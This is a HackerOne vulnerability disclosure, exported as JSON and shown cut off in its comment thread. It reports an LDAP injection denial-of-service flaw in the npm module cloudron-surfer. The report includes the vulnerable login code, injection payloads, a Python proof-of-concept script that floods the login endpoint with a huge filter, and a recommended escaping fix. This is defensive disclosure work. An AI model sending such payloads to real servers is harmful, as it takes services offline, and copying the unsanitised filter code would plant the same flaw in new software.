{
  "id": 906959,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDY5NTk=",
  "url": "https://hackerone.com/reports/906959",
  "title": "[cloudron-surfer] Denial of Service via LDAP Injection",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-06-24T17:12:07.769Z",
  "submitted_at": "2020-06-24T17:12:07.769Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "d3lla",
    "url": "/d3lla",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-08-22T08:48:44.185Z",
  "bug_reporter_agreed_on_going_public_at": "2020-08-22T08:48:44.147Z",
  "team_member_agreed_on_going_public_at": "2020-08-21T20:49:19.798Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report `Denial of service via LDAP Injection` vulnerability in `cloudron-surfer` module.\nIt allows a malicious attacker to send a malformed input that is interpreted as an LDAP filter, leading to Denial of Service.\n\n# Module\n\n**module name:** `cloudron-surfer`\n**version:** `5.9.0`\n**npm page:** `https://www.npmjs.com/package/cloudron-surfer`\n\n## Module Description\n\nSurfer is a Simple static file server. It comes with a commandline tool to upload files from your local folders and a webinterface to manage files directly on the server.\n\n## Module Stats\n\n[4] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe module is vulnerable to a DoS via LDAP Injection.\nLDAP injection is a particular case of Injection vulnerabilities that occurs when user controlled input not properly sanitized is used to build LDAP filter. \nThis could lead to modification of LDAP statements performed. Depending on the application, this could lead to an authentication bypass, information disclosure or DoS.\n\nThe problem arises during the login phase. User controlled input `username` is used to build a LDAP filter without any sanitization. \nThe filter uses an `OR` operation between different attributes that are `uid`, `mail`, `username`, `sAMAccountName`.\nThe search returns all the users whose one of the attributes above has value `username`. Then it takes the first and match with the `password` provided using a `bind` operation.\n\nThe problem occurs when the `username` contains valid LDAP character filters, like for example `*` (the filter `(cn=*)` is a presence filter that will match any entry with one or more values for the `cn` attribute), that could change the LDAP statement.\n\nIf an attacker provides as `username` the value `*`, this will result in the following filter:\n`(|(uid=*)(mail=*)(username=*)(sAMAccountName=*))`.\n\nIn order for an attacker to perform a DoS, he/she has to build a filter that will take long time to be evaluated.\nFor example, if the attacker provides the following payload `*)(cn=*)(cn=*`, this will result in the following filter:\n`(|(uid=*)(cn=*)(cn=*)(mail=*)(cn=*)(cn=*)(username=*)(cn=*)(cn=*)(sAMAccountName=*)(cn=*)(cn=*))`.\n\nIf instead of `*)(cn=*)(cn=*`, an attacker repeat the middle `(cn=*)` thousand of times, this will result in a huge filter that will take a huge amount of time to be evaluated, leading to DoS.\n\nBelow the vulnerable code:\n\n```javascript\n// https://github.com/nebulade/surfer/blob/master/src/auth.js#L72\n// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L74\n....\n\nfunction verifyUser(username, password, callback) {\n    if (AUTH_METHOD === 'ldap') {\n        var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });\n        ldapClient.on('error', function (error) {\n            console.error('LDAP error', error);\n        });\n\n        ldapClient.bind(process.env.CLOUDRON_LDAP_BIND_DN, process.env.CLOUDRON_LDAP_BIND_PASSWORD, function (error) {\n            if (error) return callback(error);\n\n            var filter = `(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))`; //<-- INJECTION: username is not sanitized\n            ldapClient.search(process.env.CLOUDRON_LDAP_USERS_BASE_DN, { filter: filter }, function (error, result) {\n                if (error) return callback(error);\n\n                var items = [];\n\n                result.on('searchEntry', function(entry) { items.push(entry.object); });\n                result.on('error', callback);\n                result.on('end', function (result) {\n                    if (result.status !== 0 || items.length === 0) return callback('Invalid credentials');\n\n                    // pick the first found\n                    var user = items[0];\n\n                    ldapClient.bind(user.dn, password, function (error) {\n                        if (error) return callback('Invalid credentials');\n\n                        callback(null, { username: username });\n                    });\n                });\n            });\n        });\n    }\n...\n\n// https://github.com/nebulade/surfer/blob/master/src/auth.js#L107\n// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L113\nexports.login = function (req, res, next) {\n    verifyUser(req.body.username, req.body.password, function (error, user) { //<-- USER CONTROLLED INPUT\n        if (error) return next(new HttpError(401, 'Invalid credentials'));\n\n        var accessToken = LOGIN_TOKEN_PREFIX + uuid();\n\n        tokenStore.set(accessToken, user, function (error) {\n            if (error) return next(new HttpError(500, error));\n\n            next(new HttpSuccess(201, { accessToken: accessToken, user: user }));\n        });\n    });\n};\n\n```\n\n```javascript\n// https://github.com/nebulade/surfer/blob/master/server.js#L76\n// https://git.cloudron.io/cloudron/surfer/-/blob/master/server.js#L75\n...\nrouter.post  ('/api/login', auth.login);\n...\n```\n## Steps To Reproduce:\n\nTo test this app on a real live system, you need first to install `Cloudron` (https://cloudron.io/get.html) and then install the `Surfer` app (https://cloudron.io/store/io.cloudron.surfer.html). In order to install the `Cloudron` app you need first a domain. In this case the web interface is available under the `https://[appdomain]/_admin/` location.\n\nIstead of the above setting, I tested the app locally. \nBelow steps to reproduce the vulnerability.\n\nAs mentioned in another project (https://github.com/nebulade/meemo#development ), to simulate a LDAP server for users authentication, I used a test server provided by the same author (https://github.com/nebulade/ldapjstestserver). (you can find attached).\n\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `cloudron-surfer` module:\n    -  `npm i cloudron-surfer`\n\n- start the LDAP test server:\n    -  `node ldapjstestserver.js`\n\n- start the `surfer` app locally (we need to setup some enviroment variables to enable the LDAP authentication):\n    - `CLOUDRON_LDAP_BIND_DN=\"cn=admin,ou=users,dc=example\" CLOUDRON_LDAP_BIND_PASSWORD=\"password\" CLOUDRON_LDAP_USERS_BASE_DN=\"ou=users,dc=example\" CLOUDRON_LDAP_URL=\"ldap://localhost:3002\" node node_modules/cloudron-surfer/server.js`\n\nBefore performing the attack let's first check that everything works as expected:\n- visit `http://localhost:3000/_admin/`\n- enter `normal` and `test` respectively in the `username` and `password` fields and the click enter\n- logout \n\nBefore performing the attack let's first check that everything works as expected even with a long value for `username`:\n- visit `http://localhost:3000/_admin/`\n- run the following `python` script (`run_safe.py`):\n\n```python\nimport requests\n\nurl = 'http://localhost:3000/api/login'\n\npayload =  \"a\"*(len(\"*)\") + len(\"(cn=*)\")*700000 + len(\"(cn=*\"))\n\nprint(f\"Payload's length: {len(payload)} characters\")\n\ndata = {\n    'username': payload,\n    'password': 'pass'\n}\n\nresponse = requests.post(url, data = data)\n```\n\n- enter `normal` and `test` respectively in the `username` and `password` fields and the click enter\n- logout \n\nReproduce the attack:\n- visit `http://localhost:3000/_admin/`\n- run the following `python` script (`run.py`):\n\n```python\nimport requests\n\nurl = 'http://localhost:3000/api/login'\n\npayload = \"*)\" + \"(cn=*)\"*700000 + \"(cn=*\"\n\nprint(f\"Payload's length: {len(payload)} characters\")\n\ndata = {\n    'username': payload,\n    'password': 'pass'\n}\n\nresponse = requests.post(url, data = data)\n```\n- the page will load until the server crashes. After some time you will get the following error:\n`FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`\n\nIf an attacker send one (like in my case) or multiple requests like in the previous example, he/she could potentially makes the service unavaible and consumes all the server resources, leading to DoS.\n\n{F881315}\n\n## Patch\nSanitize the user input before using it to build LDAP filters.\n\nPossible solution could be for example this one (taken from another project):\n- Github Issue: [Vulnerable to ldap injection](https://github.com/vesse/node-ldapauth-fork/issues/21)\n- Github Commit: [Sanitize user input: Replace the specific special characters with codes as defined in LDAP specification.](https://github.com/vesse/node-ldapauth-fork/commit/3feea43e243698bcaeffa904a7324f4d96df60e4) \n\nInspired by the same issue (https://github.com/vesse/node-ldapauth-fork/issues/21), here there are the RFC specifications (https://tools.ietf.org/search/rfc4515#section-3 ):\n```\n    The rule ensures that the entire filter string is a\n    valid UTF-8 string and provides that the octets that represent the\n    ASCII characters \"*\" (ASCII 0x2a), \"(\" (ASCII 0x28), \")\" (ASCII\n    0x29), \"\" (ASCII 0x5c), and NUL (ASCII 0x00) are represented as a\n    backslash \"\" (ASCII 0x5c) followed by the two hexadecimal digits\n    representing the value of the encoded octet.\n\n    This simple escaping mechanism eliminates filter-parsing ambiguities\n    and allows any filter that can be represented in LDAP to be\n    represented as a NUL-terminated string. Other octets that are part\n    of the set may be escaped using this mechanism, for example,\n    non-printing ASCII characters.\n\n    For AssertionValues that contain UTF-8 character data, each octet of\n    the character to be escaped is replaced by a backslash and two hex\n    digits, which form a single octet in the code of the character. For\n    example, the filter checking whether the \"cn\" attribute contained a\n    value with the character \"\" anywhere in it would be represented as\n    \"(cn=\\2a*)\".\n\n    As indicated by the rule, implementations MUST escape\n    all octets greater than 0x7F that are not part of a valid UTF-8\n    encoding sequence when they generate a string representation of a\n    search filter. Implementations SHOULD accept as input strings that\n    are not valid UTF-8 strings. This is necessary because RFC 2254 did\n    not clearly define the term \"string representation\" (and in\n    particular did not mention that the string representation of an LDAP\n    search filter is a string of UTF-8-encoded Unicode characters).\n```\n\n\n\n\n## Supporting Material/References:\n\nSome helpful resources I used for this research:\n- [LDAP injection](https://en.wikipedia.org/wiki/LDAP_injection)\n- [LDAP Filters](https://ldap.com/ldap-filters/)\n- [BlackHat: LDAP Injection & Blind LDAP Injection](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)\n- [Understanding and Defending Against LDAP Injection Attacks](https://ldap.com/2018/05/04/understanding-and-defending-against-ldap-injection-attacks/)\n- [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)\n- [Ldapjs - orfilter](http://ldapjs.org/filters.html#orfilter)\n\nMy setup:\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nDenial of service",
  "weakness": {
    "id": 99,
    "name": "LDAP Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 881310,
      "file_name": "run_safe.py",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wTX76bpZALUnSpLW5HUjd8d7?response-content-disposition=attachment%3B%20filename%3D%22run_safe.py%22%3B%20filename%2A%3DUTF-8%27%27run_safe.py&response-content-type=text%2Fx-python-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072442Z&X-Amz-Expires=1498&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9f033dfa88bc5ba79ba691484e0589539db057266903c2db8f9f5553a414569d",
      "file_size": 282,
      "type": "text/x-python-script",
      "moderated": null
    },
    {
      "id": 881311,
      "file_name": "ldapjstestserver.js",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6M54rGLh3V1aZhYsLuXMuqnX?response-content-disposition=attachment%3B%20filename%3D%22ldapjstestserver.js%22%3B%20filename%2A%3DUTF-8%27%27ldapjstestserver.js&response-content-type=application%2Fx-perl&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072442Z&X-Amz-Expires=1498&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c854c8518fa82fd829716d676261f22bed6a35fc9f81313c115291db62d5c58c",
      "file_size": 5346,
      "type": "application/x-perl",
      "moderated": null
    },
    {
      "id": 881312,
      "file_name": "run.py",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/btBL7Q65huMNego4nVb5p2AK?response-content-disposition=attachment%3B%20filename%3D%22run.py%22%3B%20filename%2A%3DUTF-8%27%27run.py&response-content-type=text%2Fx-python-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072442Z&X-Amz-Expires=1498&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f9cf7e0598d6fea2aeedae0f857979c6195eeaf12004e5feab34a84fcd99cc78",
      "file_size": 260,
      "type": "text/x-python-script",
      "moderated": null
    },
    {
      "id": 881315,
      "file_name": "poc.mov",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3Ye5mgaQdPKPn9yNzGtceDcB?response-content-disposition=attachment%3B%20filename%3D%22poc.mov%22%3B%20filename%2A%3DUTF-8%27%27poc.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072442Z&X-Amz-Expires=1498&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=613dcae989218433d28b548e3615b3de7621c8ddc291853e62225a7ee3dd11ba",
      "file_size": 57057039,
      "type": "video/quicktime",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-09-20T20:49:19.898Z",
  "allow_singular_disclosure_after": -94818922.21060847,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "can",
    "prasanthpro",
    "anas2003",
    "fall4w",
    "surya_m2003",
    "aizen07",
    "airim-coder"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 8429951,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi,\nI hope everyone is staying safe :)\n\nIs there any update?\n\nThank you for your patience and have a nice day,\nd3lla\n",
      "automated_response": false,
      "created_at": "2020-06-27T15:59:32.280Z",
      "updated_at": "2020-06-27T15:59:32.280Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8563989,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi,\nI hope everyone is staying safe :)\n\nIs there any update?\n\nThank you for your patience and have a nice day,\nd3lla\n",
      "automated_response": false,
      "created_at": "2020-07-10T19:18:58.368Z",
      "updated_at": "2020-07-10T19:18:58.368Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8828346,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for reporting this. I will do the next steps.",
      "automated_response": false,
      "created_at": "2020-08-02T11:03:34.911Z",
      "updated_at": "2020-08-02T11:03:34.911Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8951139,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ExternalUserJoined",
      "message": "",
      "automated_response": false,
      "created_at": "2020-08-16T20:29:55.391Z",
      "updated_at": "2020-08-16T20:29:55.391Z",
      "actor": {
        "username": "nebulon",
        "cleared": false,
        "verified": false,
        "url": "/nebulon",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/aB4HRBYPt64phWJLezBaHSBT/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8951154,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi, thanks for inviting me here. I also got the same issue with my meemo app so I will apply the same fix there.",
      "automated_response": false,
      "created_at": "2020-08-16T20:34:35.375Z",
      "updated_at": "2020-08-16T20:34:35.375Z",
      "actor": {
        "username": "nebulon",
        "cleared": false,
        "verified": false,
        "url": "/nebulon",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/aB4HRBYPt64phWJLezBaHSBT/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
